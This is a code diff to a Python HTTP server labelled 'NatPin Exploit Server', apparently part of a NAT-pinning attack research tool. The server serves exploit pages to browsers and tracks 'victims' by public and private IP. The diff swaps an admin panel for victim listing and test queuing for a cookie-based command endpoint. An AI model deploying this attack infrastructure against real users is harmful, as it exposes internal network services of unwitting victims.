@@ -8,6 +8,8 @@ import random
 import struct
 import select
 import time
+import uuid
+import base64
 
 class HTTPProtoHandler(asyncore.dispatcher_with_send):
 	REQPAGE = ""
@@ -35,6 +37,10 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 		data = self.recv(1024)
 		request = self.get_header(data,"GET", " ")
 		cookie = self.get_header(data,"cookie", ":")
+		if cookie == "":
+			cookie = base64.urlsafe_b64encode(uuid.uuid4().bytes).replace("=","")
+		else:
+			cookie = cookie.split(" ")[1]
 		_page = ""
 		if request <>"":
 			headerparts = request.split(" ")
@@ -46,63 +52,44 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 		page = _page.split("?")[0];
 		if page != "":
 			arrPages = ["exploit.html","exploit.swf","gremwell_logo.png","login.html"]
-			arrAdminPages=["admin.html","admin.js","admin.css"]
-			arrCommands = ["xclients","xresults","xtest"]
+			arrCommands = ["cli"]
 			if page in arrPages:
 				agent = self.get_header(data,"USER-AGENT",":")
 				self.server.log("---" + agent,4)
-				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
+				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: $len$\r\n\r\n"""
 				f = open("exploit/"+page,"r")
 				body = f.read()
-				f.close()
-			elif page in arrAdminPages:
-				agent = self.get_header(data,"USER-AGENT",":")
-				self.server.log("---" + agent,4)
-				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
-				f = open("exploit/"+page,"r")
-				body = f.read()
-				f.close()			
-			elif page.split("?")[0] in arrCommands:
-				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
+				f.close()		
+			elif page in arrCommands:
+				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: $len$\r\n\r\n"""
 				body=""
-				if page=="xclients":
-					clientrowid=0
-					for client in self.server.CALLER.getVictims():
-						body = body + "<div id='"+client.VIC_ID+"' onclick='handle_clientClick("+str(clientrowid) +");'>"+client.VIC_ID +"</div>" + "|" + client.PUBLIC_IP + "|" + client.PRIVATE_IP + "|" + str(client.LAST_SEEN) + "|" +"\n"
-						clientrowid=clientrowid+1
-				elif page=="xresults":
-					page_parts = _page.split("?")
-					if len(page_parts)==2:
-						client = self.server.CALLER.getVictimById(int(page_parts[1]));#returns None on error
-						if client !=None:
-							for result in client.TESTS:
-								rsltstr ="Failed"
-								if result.RESULT==True: 
-									rsltstr="Success"
-								body = body + result.TEST_TYPE + "|" + result.STATUS + "|" + result.PRIVATE_IP + "|" + result.PRIVATE_PORT + "|" + rsltstr + "|" + result.PUBLIC_PORT + " (" + result.TRANSPORT + ")\n" 
+				if page=="cli":
+					if len(_page.split("?"))!=2:
+						body ="Invalid command."
 					else:
-						body=""
-				elif page=="xtest":
-					page_parts = _page.split("?")
-					if len(page_parts)==2:
-						params = page_parts[1].split("&")
-						if len(params)==4:
-							if self.server.CALLER.isValidTestCommand(params[0],params[1],params[2],params[3],False)==True:
-								client = self.server.CALLER.getVictimById(int(params[0]))
-								if params[1].upper() != "ALL":
-									client.addTest(params[1].upper(), params[2], params[3])
-								else:
-									#run all proto tests
-									for xproto in self.server.CALLER.PROTOS:
-										client.addTest(xproto, params[2], params[3])	
+						cmdsrv = self.getCommandServer()
+						if cmdsrv != None:
+							command= _page.split("?")[1].strip().split("_")
+							if command[0].upper()=="REG":
+								#DISABLED FOR NOW
+								#self.server.log("Web REG request " + cookie, 2)
+								#cmdsrv.createVictim(cookie,self.server.CALLER.getRemotePeer(self),"")
 				else:
 					body=""
 			else:
-				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nContent-Length: 0\r\n\r\n"""
+				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: 0\r\n\r\n"""
 				body = ""
 			respheader = respheader.replace("$len$",str(len(body)))
+			respheader = respheader.replace("$cookie$",cookie)
 			self.send(respheader+body)
 			#self.send(body)
+	def getCommandServer(self):
+		result = None
+		for server in self.server.CALLER.SERVERS:
+			if server.TYPE=="Command Server":
+				result = server
+				break
+		return result
 #end class
 
 class Server(Base):
